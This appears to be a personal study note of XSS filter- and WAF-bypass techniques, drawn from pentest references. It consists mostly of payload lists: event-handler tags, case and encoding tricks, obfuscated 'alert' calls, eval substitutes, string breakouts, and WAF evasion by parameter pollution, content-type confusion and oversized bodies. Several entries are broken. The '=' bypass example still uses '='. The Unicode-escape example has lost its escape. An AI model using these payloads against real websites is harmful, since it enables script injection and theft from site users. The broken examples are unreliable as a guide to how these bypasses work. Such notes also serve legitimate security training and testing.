# XSS Filter Bypass Techniques

← [[XSS-Overview]]

---

WAFs and input filters try to block XSS payloads. This note covers how to get around them. For raw payloads, see the [[XSS-Payloads]] cheatsheet.

---

## Identify What's Being Filtered

Before bypassing, know what's blocked. Test systematically:

```
<script>         → blocked or allowed?
alert(           → blocked?
onerror=         → blocked?
javascript:      → blocked?
' " < >          → encoded or stripped?
```

---

## Tag-Level Bypasses

### When `<script>` Is Blocked

```html
<!-- Event handler tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>
```

### Tag Case Variation

Some filters match lowercase only:

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<Img src=x onError=alert(1)>
<SVG ONLOAD=alert(1)>
```

### Null Bytes and Special Characters

```html
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\nIpT>alert(1)</ScRiPt>
```

---

## Attribute-Level Bypasses

### When Spaces Are Filtered

```html
<!-- Use / as separator -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Use newline -->
<img src=x
onerror=alert(1)>

<!-- Tab character -->
<img	src=x	onerror=alert(1)>
```

### When `=` Is Filtered

```html
<img src=x onerror ="alert(1)">
```

### Without Quotes

```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert`1`>
```

---

## JavaScript Bypasses

### When `alert` Is Blocked

```javascript
alert`1`                    // template literal call
confirm(1)
prompt(1)
console.log(1)              // for PoC (visible in DevTools)
window['ale'+'rt'](1)       // string concatenation
window['\x61lert'](1)       // hex escape
```

### When Parentheses Are Blocked

```javascript
alert`1`
throw/a/,alert`1`
```

### When Keywords Are Blocked

```javascript
// 'alert' blocked
window['ale'+'rt'](1)
window[atob('YWxlcnQ=')](1)     // base64 decode: 'alert'
[1].find(alert)

// 'script' blocked in HTML — use alternatives above
```

### `eval` Alternatives

```javascript
// All equivalent to eval():
setTimeout('alert(1)')
setInterval('alert(1)',99999)
Function('alert(1)')()
[].constructor.constructor('alert(1)')()
```

---

## Encoding Bypasses

### HTML Entity Encoding

Works inside HTML attributes and sometimes tag content:

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<!-- javascript:alert(1) in HTML decimal entities -->

<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
<!-- javascript:alert(1) in HTML hex entities -->
```

### URL Encoding (in href/src)

```html
<a href="javascript:%61lert(1)">   <!-- 'a' URL encoded -->
<a href="javascript:%61%6c%65%72%74(1)">  <!-- full URL encode -->
```

### Double Encoding

Some apps decode input once for filtering, then decode again before use:

```
%3Cscript%3E  → first decode → <script>  [caught by filter]
%253Cscript%253E → first decode → %3Cscript%3E → second decode → <script>  [bypasses filter]
```

### Unicode Escapes (in JS context)

```javascript
alert(1)    // a = 'a'
\u{61}lert(1)    // ES6 unicode escape
```

---

## WAF Bypass Techniques

### Chunked Transfer Encoding

Some WAFs don't inspect chunked request bodies properly.

### Parameter Pollution

Send the parameter multiple times — WAF sees the first (safe), app uses the last (malicious):

```
?name=safe&name=<script>alert(1)</script>
```

### Content-Type Confusion

```
POST /search
Content-Type: application/x-www-form-urlencoded

q=<script>alert(1)</script>

vs.

POST /search
Content-Type: text/plain

q=<script>alert(1)</script>
```

### Size-Based Bypass

Large payloads can exceed WAF inspection limits:

```
name=AAAA[x10000]<script>alert(1)</script>
```

---

## Context-Specific Tricks

### Breaking Out of JavaScript Strings

```javascript
// Single-quoted string
';alert(1)//
'-alert(1)-'
\';alert(1)//

// Double-quoted string
";alert(1)//

// Template literal
${alert(1)}
```

### Nested Tag Trick

Some filters strip `<script>` once — if they only do one pass:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- After stripping <script>: <script>alert(1)</script> -->
```

---

*Back to [[XSS-Overview]] | Quick payloads: [[XSS-Payloads]]*

*Sources: PortSwigger Web Security Academy, PayloadsAllTheThings*
